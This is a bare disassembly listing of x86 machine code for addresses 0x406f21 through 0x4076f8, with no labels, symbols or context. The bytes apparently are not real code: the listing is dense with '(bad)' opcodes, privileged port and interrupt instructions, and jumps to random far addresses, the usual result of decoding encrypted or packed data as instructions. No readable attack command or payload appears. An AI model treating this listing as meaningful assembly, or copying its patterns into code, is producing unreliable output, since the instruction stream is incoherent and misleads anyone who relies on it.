  406f21:	mov    ah,BYTE PTR [esi-0x659eaa65]
  406f27:	rcr    edi,0xfa
  406f2a:	mov    ds:0xbe39b1ad,eax
  406f2f:	mov    edi,0xec3d8096
  406f34:	iret   
  406f35:	sti    
  406f36:	or     eax,0x8c50e5e0
  406f3b:	sbb    al,0x11
  406f3d:	dec    esp
  406f3e:	add    al,0x88
  406f40:	lds    ebx,FWORD PTR [edi+edx*2-0x59]
  406f44:	lock pop ss
  406f46:	loope  0x406f6f
  406f48:	ss (bad) 
  406f4a:	dec    eax
  406f4b:	in     al,dx
  406f4c:	fmul   DWORD PTR [edi]
  406f4e:	mov    edi,0xc6dc5382
  406f53:	sbb    ah,BYTE PTR [eax]
  406f55:	xchg   ebx,eax
  406f56:	xchg   ebp,eax
  406f57:	push   es
  406f58:	add    BYTE PTR [ecx],bl
  406f5a:	clc    
  406f5b:	sub    BYTE PTR [esi+0x16d97688],dh
  406f61:	push   ss
  406f62:	fld    TBYTE PTR [edi+eiz*2+0x45]
  406f66:	adc    al,0xb0
  406f68:	sti    
  406f69:	add    BYTE PTR [eax],ah
  406f6b:	hlt    
  406f6c:	or     DWORD PTR [eax+ecx*8],0xffffff81
  406f70:	(bad)  
  406f72:	lock ret 
  406f74:	mov    cl,0x7d
  406f76:	and    bh,bh
  406f78:	jae    0x406f86
  406f7a:	add    cl,BYTE PTR [eax]
  406f7c:	xchg   esi,eax
  406f7d:	jge    0x406f1a
  406f7f:	or     DWORD PTR [ebx-0x4e],ebx
  406f82:	mov    bh,0xd0
  406f84:	sbb    al,0xe8
  406f86:	mov    eax,0x81877208
  406f8b:	sub    al,0xe8
  406f8d:	retf   
  406f8e:	xchg   esi,eax
  406f8f:	fadd   DWORD PTR [ecx-0x4073f50f]
  406f95:	in     al,0x24
  406f97:	pop    edx
  406f98:	int    0x96
  406f9a:	dec    edx
  406f9b:	shl    DWORD PTR [esi-0x45],0x98
  406f9f:	cdq    
  406fa0:	in     al,dx
  406fa1:	or     ebx,ecx
  406fa3:	sbb    ah,al
  406fa5:	fmul   QWORD PTR [edi]
  406fa7:	mov    esi,0x64c8dcf0
  406fac:	dec    ebp
  406fad:	or     esi,DWORD PTR [eax-0x76]
  406fb0:	sbb    ebx,eax
  406fb2:	inc    eax
  406fb3:	sub    ebx,DWORD PTR es:[esp+edx*8-0x3b]
  406fb8:	sbb    dl,ah
  406fba:	mov    bl,0xb9
  406fbc:	sbb    ah,0x68
  406fbf:	xchg   ebp,eax
  406fc0:	jmp    0x904f3195
  406fc5:	gs push esp
  406fc7:	lods   al,BYTE PTR ds:[esi]
  406fc8:	ror    ah,1
  406fca:	sbb    al,0xcd
  406fcc:	jo     0x406fde
  406fce:	mov    dl,0xcc
  406fd0:	cmp    bl,BYTE PTR [ecx-0xd]
  406fd3:	nop
  406fd4:	in     eax,dx
  406fd5:	pop    eax
  406fd6:	and    DWORD PTR [esi-0x38],0x3e
  406fda:	mov    ecx,0xfcc82904
  406fdf:	das    
  406fe0:	xor    al,0x91
  406fe2:	cld    
  406fe3:	jmp    0xcaff:0x660774c9
  406fea:	je     0x406ffd
  406fec:	jmp    0x407016
  406fee:	xchg   ebx,eax
  406fef:	shl    DWORD PTR [esi-0x30],0x53
  406ff3:	adc    dh,BYTE PTR [edi]
  406ff5:	(bad)  
  406ff6:	fadd   st(5),st
  406ff8:	inc    eax
  406ff9:	xchg   esi,eax
  406ffa:	rol    ah,1
  406ffc:	and    ecx,DWORD PTR [edi]
  406ffe:	test   BYTE PTR [ebx],cl
  407000:	call   0x2591:0x77708b78
  407007:	(bad)  
  407008:	mov    edi,0x3b67f879
  40700d:	cmp    ecx,DWORD PTR ds:[eax+0x7f8501e4]
  407014:	dec    eax
  407015:	pop    esp
  407016:	iret   
  407017:	add    edx,ebx
  407019:	dec    ebp
  40701a:	mov    bl,0x6c
  40701c:	xchg   esi,eax
  40701d:	int    0xf0
  40701f:	or     al,0xce
  407021:	das    
  407022:	push   edx
  407023:	jno    0x407072
  407025:	mov    edx,0xce9036cb
  40702a:	and    esp,DWORD PTR [ecx-0x2c9ab1f5]
  407030:	xor    eax,0xdbbe1393
  407035:	add    edi,eax
  407037:	adc    eax,0x5ce1b0cf
  40703c:	cdq    
  40703d:	xor    ch,dh
  40703f:	fst    DWORD PTR [edi+0x0]
  407042:	mov    al,0x77
  407044:	and    DWORD PTR [ebx-0x9433fb7],eax
  40704a:	sbb    ecx,DWORD PTR [esi+eax*8+0x21]
  40704e:	loope  0x40700c
  407050:	psubusw mm0,QWORD PTR [eax]
  407053:	cmp    DWORD PTR [eax-0x7c9bcda4],edi
  407059:	mov    eax,0xa3b4dd22
  40705e:	sub    BYTE PTR [ebx+eax*4],ah
  407061:	mov    ah,0x19
  407063:	push   es
  407064:	xor    cl,al
  407066:	(bad)  
  407067:	pop    esi
  407068:	mov    al,0xb0
  40706a:	or     DWORD PTR [ebx],ebx
  40706c:	mov    ebx,cs
  40706e:	push   ds
  40706f:	lods   al,BYTE PTR ds:[esi]
  407070:	pusha  
  407071:	lods   al,BYTE PTR ds:[esi]
  407072:	push   ds
  407073:	cdq    
  407074:	sar    DWORD PTR [esi+0x128b590f],0x10
  40707b:	adc    BYTE PTR [eax+0x30642ea8],dh
  407081:	pop    esp
  407082:	sbb    al,0x4e
  407084:	test   al,0xa4
  407086:	out    dx,eax
  407087:	inc    edx
  407088:	push   cs
  407089:	stc    
  40708a:	jmp    0x2e79:0x1ca0a4be
  407091:	in     al,0x90
  407093:	mov    dh,0xa0
  407095:	pushf  
  407096:	mov    bh,0xce
  407098:	cmp    BYTE PTR [edx],dh
  40709a:	push   cs
  40709b:	pushf  
  40709c:	sbb    BYTE PTR [eax],al
  40709e:	push   ebp
  40709f:	cwde   
  4070a0:	xchg   edi,eax
  4070a1:	sbb    eax,0x98383064
  4070a6:	jmp    0x407110
  4070a8:	rcl    BYTE PTR [ecx+eax*4+0x1b60c871],0x94
  4070b0:	dec    esp
  4070b1:	push   ecx
  4070b2:	push   cs
  4070b3:	fwait
  4070b4:	fs jecxz 0x4070a2
  4070b7:	ds dec esi
  4070b9:	nop
  4070ba:	nop
  4070bb:	and    ebp,DWORD PTR [eax]
  4070bd:	pop    ebp
  4070be:	cmp    al,0x5d
  4070c0:	mov    al,0x27
  4070c2:	daa    
  4070c3:	ret    
  4070c4:	xor    al,0xc5
  4070c6:	adc    al,0x80
  4070c8:	and    BYTE PTR [ebx-0x7373d694],dl
  4070ce:	xor    ecx,ecx
  4070d0:	int    0xc3
  4070d2:	xchg   esp,eax
  4070d3:	lock iret 
  4070d5:	mov    WORD PTR [edx-0x7cf657f9],?
  4070db:	or     DWORD PTR [ecx],0x4485fa3a
  4070e1:	pusha  
  4070e2:	fldenv [ebp-0x80]
  4070e5:	scas   al,BYTE PTR es:[edi]
  4070e6:	add    al,0x19
  4070e8:	dec    eax
  4070e9:	push   edx
  4070ea:	icebp  
  4070eb:	retf   0xb7ee
  4070ee:	pop    esi
  4070ef:	out    0x1e,eax
  4070f1:	push   es
  4070f2:	inc    ecx
  4070f3:	ss out dx,eax
  4070f5:	in     al,dx
  4070f6:	in     al,dx
  4070f7:	mov    ds:0x9c801ed0,al
  4070fc:	inc    eax
  4070fd:	test   eax,edx
  4070ff:	or     BYTE PTR [eax],al
  407101:	jmp    0x407095
  407103:	or     eax,0xece95646
  407108:	in     al,dx
  407109:	sub    DWORD PTR [eax+0x4e],ecx
  40710c:	push   es
  40710d:	and    edi,ebx
  40710f:	mov    eax,ss
  407111:	push   es
  407112:	mov    cl,0x18
  407114:	sbb    ebp,DWORD PTR [ecx+0x7738ec1c]
  40711a:	enter  0xc0b,0x56
  40711e:	fild   DWORD PTR [esi]
  407120:	rcl    DWORD PTR [ecx-0x3eff1b64],1
  407126:	fmul   DWORD PTR ds:0x783237d1
  40712c:	js     0x40710e
  40712e:	push   ebx
  40712f:	sbb    ah,al
  407131:	loopne 0x40719d
  407133:	sbb    eax,eax
  407135:	and    cl,cl
  407137:	int3   
  407138:	out    dx,al
  407139:	xor    bl,BYTE PTR fs:[eax-0x3e]
  40713d:	or     DWORD PTR [edi+0x19eb3ad1],ebp
  407143:	fs pop ecx
  407145:	cmp    BYTE PTR [eax+0x29],dl
  407148:	loopne 0x407136
  40714a:	loopne 0x407163
  40714c:	enter  0x8f3,0xb6
  407150:	shl    esp,1
  407152:	ror    DWORD PTR [ecx+ecx*2],cl
  407155:	dec    esp
  407156:	sahf   
  407157:	shl    eax,1
  407159:	push   ds
  40715a:	nop
  40715b:	repnz xchg edx,eax
  40715d:	or     BYTE PTR [ecx+0x1f],cl
  407160:	push   ds
  407161:	and    dl,bh
  407163:	mov    edx,0x2a00c9e5
  407168:	adc    eax,0x750369d2
  40716d:	ins    BYTE PTR es:[edi],dx
  40716e:	call   0xf3d2:0xb89d69a6
  407175:	adc    al,0xd3
  407177:	imul   edx,DWORD PTR [esi+0x4e31b34d],0x1f
  40717e:	aam    0x38
  407180:	bt     si,0x5b
  407185:	mov    dl,0xe
  407187:	aam    0x13
  407189:	sbb    DWORD PTR [ebx+eax*1-0x4edf1948],0xd3f1d369
  407194:	push   ds
  407195:	xor    DWORD PTR [eax-0x37f1b530],esp
  40719b:	(bad)  
  40719c:	test   al,0x8
  40719e:	add    BYTE PTR [edx-0x4013bb6b],dh
  4071a4:	daa    
  4071a5:	push   ds
  4071a6:	sbb    al,BYTE PTR [eax+esi*4-0x6b]
  4071aa:	les    ebx,FWORD PTR [esi]
  4071ac:	sbb    DWORD PTR [ecx],esp
  4071ae:	adc    DWORD PTR [ebp+eax*4+0x1e],ebp
  4071b2:	and    BYTE PTR [esi],bl
  4071b4:	pop    ss
  4071b5:	dec    eax
  4071b6:	add    al,0x5b
  4071b8:	and    BYTE PTR [esi],bl
  4071ba:	xor    ebx,ecx
  4071bc:	push   esi
  4071bd:	adc    dh,BYTE PTR [ebx+0x1c1e1cdc]
  4071c3:	les    esp,FWORD PTR [eax+0x2b]
  4071c6:	mov    DWORD PTR [esi+0x1b],edx
  4071c9:	lods   eax,DWORD PTR ds:[esi]
  4071ca:	in     al,0x96
  4071cc:	sbb    al,bl
  4071ce:	adc    BYTE PTR [ecx],0xe4
  4071d1:	xor    dl,BYTE PTR [ecx]
  4071d3:	loopne 0x4071f9
  4071d5:	cs ins BYTE PTR es:[edi],dx
  4071d7:	inc    eax
  4071d8:	loopne 0x4071bd
  4071da:	fcom   QWORD PTR [ecx]
  4071dc:	inc    eax
  4071dd:	loop   0x4071a1
  4071df:	push   cs
  4071e0:	fcomp  QWORD PTR [ebx]
  4071e2:	fcom   DWORD PTR [ecx]
  4071e4:	xor    cl,BYTE PTR [ecx+0xc]
  4071e7:	ins    BYTE PTR es:[edi],dx
  4071e8:	fcomp  DWORD PTR [edx]
  4071ea:	adc    esp,edx
  4071ec:	and    ecx,DWORD PTR [ecx-0x232bf26b]
  4071f2:	cs xor bl,dl
  4071f5:	lods   al,BYTE PTR ds:[esi]
  4071f6:	cmp    bh,BYTE PTR gs:[edi-0x4df999d7]
  4071fd:	sbb    eax,0xbf98cc6b
  407202:	hlt    
  407203:	mov    dh,0xcc
  407205:	fsub   DWORD PTR [ebx+eiz*1+0x24]
  407209:	adc    DWORD PTR [esi+0x312437c8],ebx
  40720f:	nop
  407210:	in     eax,0xc0
  407212:	lods   al,BYTE PTR ds:[esi]
  407213:	enter  0x5c11,0x9e
  407217:	pop    ebp
  407218:	dec    esi
  407219:	xchg   ecx,eax
  40721a:	aam    0x6e
  40721c:	(bad)  
  40721d:	add    esp,ebp
  40721f:	aam    0x2
  407221:	aad    0xdb
  407223:	xor    al,0x4d
  407225:	mov    bl,0x1e
  407227:	inc    ecx
  407228:	and    DWORD PTR fs:[edx+0x364c23d5],0xffffffe9
  407230:	cs mov bl,0xb
  407233:	pusha  
  407234:	adc    edx,eax
  407236:	adc    ebx,DWORD PTR [ebx+0x3edd765]
  40723c:	or     dl,dh
  40723e:	daa    
  40723f:	inc    esp
  407240:	(bad)  
  407241:	adc    DWORD PTR [ecx+0x21],esi
  407244:	dec    esp
  407245:	enter  0xc4c4,0x49
  407249:	shl    BYTE PTR [esi+eax*1],0x76
  40724d:	and    BYTE PTR [ecx],dl
  40724f:	rcr    BYTE PTR [ebx],0x11
  407252:	sbb    BYTE PTR [edx-0x4343d1bf],dh
  407258:	and    bl,ch
  40725a:	or     al,0x96
  40725c:	lea    edx,[eax+0x24312234]
  407262:	test   cl,al
  407264:	sbb    BYTE PTR [ecx+edx*2-0x4f6b54c],dh
  40726b:	dec    eax
  40726c:	dec    eax
  40726d:	xor    BYTE PTR [ebx-0x50],dl
  407270:	push   ds
  407271:	bound  edx,QWORD PTR [eax-0x4feeed91]
  407277:	mov    al,0xac
  407279:	mov    DWORD PTR [ebx],ecx
  40727b:	arpl   WORD PTR [edx+0x11],ax
  40727e:	lods   al,BYTE PTR ds:[esi]
  40727f:	dec    esi
  407280:	test   al,0x11
  407282:	nop
  407283:	mov    eax,0xeaa809b0
  407288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407289:	adc    DWORD PTR [edx],esi
  40728b:	adc    cl,BYTE PTR [ebx]
  40728d:	fwait
  40728e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40728f:	sbb    al,0x2e
  407291:	mov    bh,0x1c
  407293:	adc    cl,bl
  407295:	push   ss
  407296:	ret    0x9c11
  407299:	dec    ebx
  40729a:	and    cl,al
  40729c:	pusha  
  40729d:	cmp    BYTE PTR [ecx+edx*1+0x1246e120],bl
  4072a4:	sub    eax,0x2641111b
  4072a9:	jecxz  0x4072e4
  4072ab:	rcr    eax,0x94
  4072ae:	dec    esi
  4072af:	xchg   esp,eax
  4072b0:	leave  
  4072b1:	inc    ecx
  4072b2:	push   cs
  4072b3:	adc    dl,BYTE PTR [ecx]
  4072b5:	xor    DWORD PTR [eax+0xac910c1],esp
  4072bb:	xor    bl,cl
  4072bd:	nop
  4072be:	sub    DWORD PTR [eax-0x3e683b0b],edx
  4072c4:	iret   
  4072c5:	sub    edi,edx
  4072c7:	nop
  4072c8:	mov    edx,0xba98ea02
  4072cd:	add    eax,0x97207125
  4072d2:	push   ds
  4072d3:	lods   al,BYTE PTR ds:[esi]
  4072d4:	mov    eax,0x40e40e04
  4072d9:	mov    dh,0x33
  4072db:	enter  0xe4d0,0x18
  4072df:	pop    esp
  4072e0:	and    DWORD PTR [ecx+0x38],esi
  4072e3:	nop
  4072e4:	sbb    ecx,DWORD PTR [edx-0xfd75c88]
  4072ea:	or     BYTE PTR [edx+0x1a],dh
  4072ed:	push   es
  4072ee:	aas    
  4072ef:	bound  esi,QWORD PTR [esi+0x78]
  4072f2:	hlt    
  4072f3:	in     eax,0x89
  4072f5:	loop   0x407366
  4072f7:	push   es
  4072f8:	xor    al,0x1
  4072fa:	sub    BYTE PTR [edi-0x3fada1f9],dl
  407300:	cmovne ebp,DWORD PTR [ebp+0x70]
  407304:	je     0x40737f
  407306:	pop    ebx
  407307:	dec    esi
  407308:	jne    0x407380
  40730a:	repz inc ebp
  40730c:	or     bl,bl
  40730e:	invd   
  407310:	push   ebx
  407311:	ins    DWORD PTR es:[edi],dx
  407312:	popa   
  407313:	adc    ch,cl
  407315:	popa   
  407316:	lea    ebp,[edx+0x4907139d]
  40731c:	sbb    DWORD PTR [ebx-0x58],ebx
  40731f:	push   0xe
  407321:	ds jb  0x407347
  407324:	push   es
  407325:	stc    
  407326:	fs (bad) 
  407328:	fistp  DWORD PTR [edi]
  40732a:	ins    BYTE PTR es:[di],dx
  40732c:	push   ecx
  40732d:	cmove  ebp,DWORD PTR [edi+0x75]
  407331:	bound  edx,QWORD PTR [edx-0x40]
  407334:	dec    DWORD PTR ds:0x72754343
  40733a:	jb     0x4073a1
  40733c:	outs   dx,BYTE PTR ds:[esi]
  40733d:	arpl   bx,ax
  40733f:	push   es
  407340:	je     0x40734a
  407342:	push   es
  407343:	dec    esp
  407344:	mul    DWORD PTR [ecx-0x79]
  407347:	mov    al,ds:0x7f304f5d
  40734c:	xor    ebx,DWORD PTR [eax]
  40734e:	push   ecx
  40734f:	inc    ecx
  407350:	stos   BYTE PTR es:[edi],al
  407351:	dec    esi
  407352:	inc    edi
  407353:	and    BYTE PTR [eax-0x59],ah
  407356:	or     bl,BYTE PTR [edx-0x79]
  407359:	dec    ecx
  40735a:	xchg   ebp,eax
  40735b:	in     al,dx
  40735c:	xchg   BYTE PTR [eax+0xf6e6165],al
  407362:	mov    ebx,edi
  407364:	and    eax,0x551fb27f
  407369:	outs   dx,BYTE PTR ds:[esi]
  40736a:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  40736e:	inc    esp
  40736f:	arpl   WORD PTR gs:[ecx-0x32],bp
  407373:	xchg   edi,eax
  407374:	jge    0x40738e
  407376:	nop
  407377:	repz and al,0x30
  40737a:	inc    esi
  40737b:	out    0x68,eax
  40737d:	and    eax,0x5a6dcc0f
  407382:	je     0x40735c
  407384:	mov    ds:0x6027942,eax
  407389:	xacquire xchg DWORD PTR [ebx],ebx
  40738c:	push   edi
  40738d:	outs   dx,DWORD PTR ds:[esi]
  40738e:	jb     0x4073f4
  407390:	jbe    0x407401
  407392:	pusha  
  407393:	scas   al,BYTE PTR es:[edi]
  407394:	pushf  
  407395:	adc    esp,DWORD PTR [ebx+0x1343642]
  40739b:	rcl    DWORD PTR [eax+0x678b5322],0x0
  4073a2:	mov    bh,BYTE PTR [edi-0x60]
  4073a5:	or     al,dl
  4073a7:	ins    BYTE PTR es:[edi],dx
  4073a8:	dec    ebp
  4073a9:	push   ss
  4073aa:	pminub mm3,mm1
  4073ad:	push   es
  4073ae:	sti    
  4073af:	mov    eax,ds:0x78d1b5e7
  4073b4:	push   ebx
  4073b5:	mov    al,0xff
  4073b7:	adc    al,0x77
  4073b9:	push   ss
  4073ba:	inc    ecx
  4073bb:	fcom   st(7)
  4073bd:	jnp    0x4073c8
  4073bf:	mov    al,0x11
  4073c1:	paddb  mm7,QWORD PTR [esi-0x37]
  4073c5:	xchg   edi,eax
  4073c6:	and    BYTE PTR [ebp-0x49deabc],bh
  4073cc:	jmp    0x4073d8
  4073ce:	mov    edx,0x3641d9f0
  4073d3:	retf   
  4073d4:	nop
  4073d5:	pop    ss
  4073d6:	add    DWORD PTR [esi],ecx
  4073d8:	add    dl,bl
  4073da:	clc    
  4073db:	adc    BYTE PTR [ebx-0x728e1420],dh
  4073e1:	jl     0x4073ad
  4073e3:	cmp    ecx,DWORD PTR [ebp-0x758b5286]
  4073e9:	(bad)  
  4073ea:	push   cs
  4073eb:	push   ecx
  4073ec:	jl     0x40745d
  4073ee:	push   edx
  4073ef:	sub    BYTE PTR [ebx-0x59f002a2],0x7b
  4073f6:	jb     0x4073fe
  4073f8:	add    al,BYTE PTR [edx]
  4073fa:	sbb    esp,ebx
  4073fc:	and    al,0xfe
  4073fe:	mov    cl,0xc5
  407400:	xchg   esi,eax
  407401:	pop    ds
  407402:	out    dx,al
  407403:	cs dec esp
  407405:	lea    esi,[eax-0x4c5d3871]
  40740b:	add    al,BYTE PTR [edi-0x3c5fab9c]
  407411:	adc    eax,0xfb3fb5f2
  407416:	xlat   BYTE PTR ds:[ebx]
  407417:	adc    ch,BYTE PTR [ecx]
  407419:	shl    dh,1
  40741b:	(bad)  
  40741c:	and    BYTE PTR [ebx+eax*4-0x7b],dh
  407420:	or     al,0x30
  407422:	fs nop
  407424:	outs   dx,DWORD PTR ds:[esi]
  407425:	adc    al,BYTE PTR [eax+0x1c]
  407428:	call   0x7a40fbc6
  40742d:	loope  0x407408
  40742f:	inc    edi
  407430:	(bad)  
  407431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407432:	sbb    BYTE PTR [eax+0x4f0ced13],dh
  407438:	add    eax,0xe94a0a1d
  40743d:	punpcklbw mm1,mm0
  407440:	xchg   ebx,eax
  407441:	fwait
  407442:	inc    ecx
  407443:	outs   dx,BYTE PTR ds:[esi]
  407444:	jns    0x407444
  407446:	xchg   ebp,eax
  407447:	jnp    0x40742d
  407449:	test   BYTE PTR [eax],ah
  40744b:	mov    ds:0x66655206,eax
  407450:	ud1    edx,ecx
  407453:	bound  ebx,QWORD PTR [ecx]
  407455:	xchg   edi,eax
  407456:	sub    bh,0x3
  407459:	or     bl,cl
  40745b:	xor    eax,0x684141a2
  407460:	mov    edi,0xa87c8002
  407465:	mov    edx,0x1720cab4
  40746a:	dec    esp
  40746b:	fiadd  DWORD PTR [ebx+0x30]
  40746e:	xor    dh,BYTE PTR [edx]
  407470:	or     BYTE PTR [edi],0xc1
  407473:	mov    ah,0xc8
  407475:	mov    bh,0x40
  407477:	jbe    0x4073ff
  407479:	sahf   
  40747a:	inc    esp
  40747b:	inc    ecx
  40747c:	pop    edi
  40747d:	mov    esi,0xea838f18
  407482:	and    ah,bl
  407484:	push   0x3ce1041c
  407489:	xlat   BYTE PTR ds:[ebx]
  40748a:	test   BYTE PTR [ebx],0xa
  40748d:	mov    dl,0xcd
  40748f:	(bad)  
  407491:	aaa    
  407492:	sub    BYTE PTR [ebp+edi*8+0x25],ch
  407496:	push   0xffffffe1
  407498:	dec    ebx
  407499:	sbb    DWORD PTR [ecx+0x48b6a7c],0xffffff98
  4074a0:	cmp    eax,DWORD PTR ds:0xd417bbf8
  4074a6:	add    al,0xbf
  4074a8:	add    eax,0x75ff17a1
  4074ad:	leave  
  4074ae:	fsub   QWORD PTR [ebp+edx*1+0x6d]
  4074b2:	aam    0x39
  4074b4:	dec    ebx
  4074b5:	add    DWORD PTR [eax],ebx
  4074b7:	push   0xeef2ccb0
  4074bc:	fsub   st(2),st
  4074be:	test   BYTE PTR [edx-0x6b33109d],ch
  4074c4:	xchg   ebx,eax
  4074c5:	push   ecx
  4074c6:	test   BYTE PTR [ebp-0x74a3fee8],ah
  4074cc:	cmc    
  4074cd:	push   es
  4074ce:	ret    
  4074cf:	sub    DWORD PTR [edx-0x76ebc760],ebx
  4074d5:	push   eax
  4074d6:	xchg   ecx,eax
  4074d7:	cmp    dl,BYTE PTR [esi+0x1c]
  4074da:	xlat   BYTE PTR fs:[ebx]
  4074dc:	sbb    al,0xeb
  4074de:	sbb    al,0xcc
  4074e0:	mov    WORD PTR ds:0x7f8926a0,ds
  4074e6:	clc    
  4074e7:	cdq    
  4074e8:	pop    ss
  4074e9:	mov    edi,0x7d0619c0
  4074ee:	jne    0x40752b
  4074f0:	jnp    0x4074f6
  4074f2:	je     0x407513
  4074f4:	jl     0x407525
  4074f6:	bound  ebx,QWORD PTR [ebx]
  4074f8:	xor    BYTE PTR [edi+0x10],al
  4074fb:	pop    ds
  4074fc:	into   
  4074fd:	xor    eax,0xb0b014ef
  407502:	clc    
  407503:	inc    ebx
  407504:	cmp    BYTE PTR [edi+0x8],bh
  407507:	add    eax,0xb8b606e
  40750c:	pop    ebp
  40750d:	clc    
  40750e:	mov    edx,0x3f662b46
  407513:	jnp    0x4074db
  407515:	xor    eax,0x83bf1438
  40751a:	call   0x5214:0x8da445e8
  407521:	add    edx,0xf7aa1050
  407527:	mov    esi,0x2448aa4
  40752c:	(bad)  
  40752d:	inc    ecx
  40752e:	xor    al,0x97
  407530:	mov    esi,0xc4d9c577
  407535:	int3   
  407536:	pop    edi
  407537:	mov    ebp,DWORD PTR [eax]
  407539:	call   DWORD PTR [ebp+0x7d]
  40753c:	adc    dl,BYTE PTR [eax+0x1082399d]
  407542:	(bad)
  407545:	mov    BYTE PTR [ecx-0x50],bl
  407548:	test   al,0xd7
  40754a:	mov    DWORD PTR [edx-0x75],0x88dda3f8
  407551:	push   ebp
  407552:	sti    
  407553:	push   ebx
  407554:	jle    0x407533
  407556:	pop    edx
  407557:	xchg   edx,eax
  407558:	pop    ss
  407559:	inc    edi
  40755a:	fcomp  QWORD PTR [edx]
  40755c:	dec    ebp
  40755d:	inc    eax
  40755e:	add    al,0xd0
  407560:	inc    ebp
  407561:	rol    DWORD PTR [ebx+edx*2+0x16],1
  407565:	push   eax
  407566:	adc    eax,0xf8744c81
  40756b:	stos   DWORD PTR es:[edi],eax
  40756c:	mov    ecx,DWORD PTR ds:0x3b65467f
  407572:	inc    eax
  407573:	dec    esi
  407574:	inc    edx
  407575:	jns    0x4075c5
  407577:	fmul   QWORD PTR [edx+0x449ea75e]
  40757d:	jo     0x4074ff
  40757f:	loop   0x4075d3
  407581:	and    DWORD PTR [eax],ecx
  407583:	cmovne eax,DWORD PTR [eax+0x87ed9e0]
  40758a:	or     eax,0x6083a423
  40758f:	int3   
  407590:	lds    ebp,FWORD PTR [eax+0x69e99740]
  407596:	mov    DWORD PTR [edx+0x1b],ecx
  407599:	pop    edi
  40759a:	mov    ds:0x5690e102,eax
  40759f:	add    esi,esi
  4075a1:	sub    esp,ebx
  4075a3:	add    eax,ebx
  4075a5:	or     eax,ebx
  4075a7:	sbb    BYTE PTR [edi],ah
  4075a9:	mov    ebp,0xd9e66018
  4075ae:	pop    es
  4075af:	mov    cl,0x78
  4075b1:	xor    eax,DWORD PTR [ebx+0x54459be8]
  4075b7:	sbb    ecx,DWORD PTR [edx]
  4075b9:	pushf  
  4075ba:	xchg   edi,eax
  4075bb:	mov    al,0x49
  4075bd:	add    eax,0xf7ffc807
  4075c2:	or     ebx,DWORD PTR [edx+0x51]
  4075c5:	sub    eax,0xb16753ba
  4075ca:	pusha  
  4075cb:	clc    
  4075cc:	sbb    DWORD PTR [eax],ecx
  4075ce:	push   ds
  4075cf:	and    sp,cx
  4075d2:	cmp    eax,0x51ca0140
  4075d7:	test   esi,eax
  4075d9:	dec    esp
  4075da:	dec    eax
  4075db:	push   eax
  4075dc:	or     esp,ebx
  4075de:	pop    ebx
  4075df:	mov    esi,edx
  4075e1:	(bad)  
  4075e2:	(bad)  
  4075e3:	jae    0x40762a
  4075e5:	loopne 0x4075e5
  4075e7:	jns    0x4075f7
  4075e9:	es inc esi
  4075eb:	rcl    DWORD PTR [esi+0x607723b],0xea
  4075f2:	jbe    0x4075ab
  4075f4:	sub    edx,DWORD PTR ds:0x80f86a2d
  4075fa:	sbb    al,0x43
  4075fc:	jle    0x40762b
  4075fe:	popa   
  4075ff:	jle    0x40764c
  407601:	jle    0x4075bb
  407603:	fst    QWORD PTR ds:0xa1bc6216
  407609:	cmp    al,0xcd
  40760b:	dec    ecx
  40760c:	sti    
  40760d:	pushf  
  40760e:	fsub   DWORD PTR [eax-0x21]
  407611:	push   cs
  407612:	sub    al,0x4b
  407614:	cmp    eax,edx
  407616:	setg   BYTE PTR [eax]
  407619:	and    BYTE PTR es:[esi-0x76],al
  40761d:	loopne 0x40760f
  40761f:	mov    eax,DWORD PTR [eax+edi*4-0x7bf547aa]
  407626:	gs addr16 xor al,0x53
  40762a:	in     al,dx
  40762b:	jne    0x407691
  40762d:	jo     0x4075b8
  40762f:	sub    al,BYTE PTR [ecx-0x3a224064]
  407635:	dec    ecx
  407636:	sahf   
  407637:	inc    esp
  407638:	add    al,0x2b
  40763a:	aaa    
  40763b:	fsubp  st(6),st
  40763d:	fs dec edi
  40763f:	mov    ebx,0x48752c14
  407644:	lahf   
  407645:	push   0x75b83438
  40764a:	add    eax,DWORD PTR [ecx+0x6e]
  40764d:	inc    ecx
  40764e:	test   DWORD PTR [eax-0x26],ecx
  407651:	adc    DWORD PTR [ebx-0x4617d3d1],edx
  407657:	adc    eax,0x40f2f031
  40765c:	dec    eax
  40765d:	les    edx,FWORD PTR [ecx]
  40765f:	mov    ds:0x64b421f4,al
  407664:	jne    0x40768d
  407666:	inc    ecx
  407667:	add    DWORD PTR [ecx+0x3e],edi
  40766a:	(bad)  
  40766c:	loope  0x4076ec
  40766e:	pop    eax
  40766f:	jae    0x407603
  407671:	ficom  WORD PTR [eax+ecx*1]
  407674:	jns    0x4076b0
  407676:	retf   0xb838
  407679:	jl     0x4076c8
  40767b:	ja     0x4076f4
  40767d:	stos   DWORD PTR es:[edi],eax
  40767e:	stos   DWORD PTR es:[edi],eax
  40767f:	mov    ds:0xa4b81604,eax
  407684:	mov    ebp,0xcfba0809
  407689:	data16 add bh,al
  40768c:	mov    ah,0xbc
  40768e:	push   esp
  40768f:	pushf  
  407690:	sbb    DWORD PTR [eax],edx
  407692:	push   0x802e91df
  407697:	les    edi,FWORD PTR [esp+eax*2-0x6ff328d0]
  40769e:	mov    esi,0xf391df27
  4076a3:	nop
  4076a4:	(bad)  
  4076a5:	sbb    DWORD PTR [esp+edi*4+0x26f826ca],eax
  4076ac:	cmp    esp,DWORD PTR [ebx]
  4076ae:	dec    edi
  4076af:	(bad)  
  4076b1:	hlt    
  4076b2:	loop   0x407678
  4076b4:	push   ebx
  4076b5:	xchg   ecx,eax
  4076b6:	nop
  4076b7:	leave  
  4076b8:	test   eax,0x107297e8
  4076bd:	into   
  4076be:	dec    ecx
  4076bf:	jo     0x407739
  4076c1:	xor    esp,DWORD PTR [ecx]
  4076c3:	fild   WORD PTR [ebp+0x345ccc9c]
  4076c9:	aas    
  4076ca:	sub    bh,bl
  4076cc:	pop    ds
  4076cd:	add    BYTE PTR [esi-0x4a],al
  4076d0:	fidiv  DWORD PTR [ebx+edx*1]
  4076d3:	xchg   esi,eax
  4076d4:	cmp    eax,eax
  4076d6:	and    al,0xbe
  4076d8:	(bad)  
  4076da:	pusha  
  4076db:	into   
  4076dc:	call   0x303866e5
  4076e1:	cld    
  4076e2:	mov    edi,0x2a0c7f3c
  4076e7:	sub    cl,BYTE PTR [eax]
  4076e9:	or     dh,BYTE PTR ds:0x153e2918
  4076ef:	das    
  4076f0:	or     al,0x53
  4076f2:	adc    eax,0xffff3916
  4076f7:	(bad)  
  4076f8:	jmp    DWORD PTR [ecx]
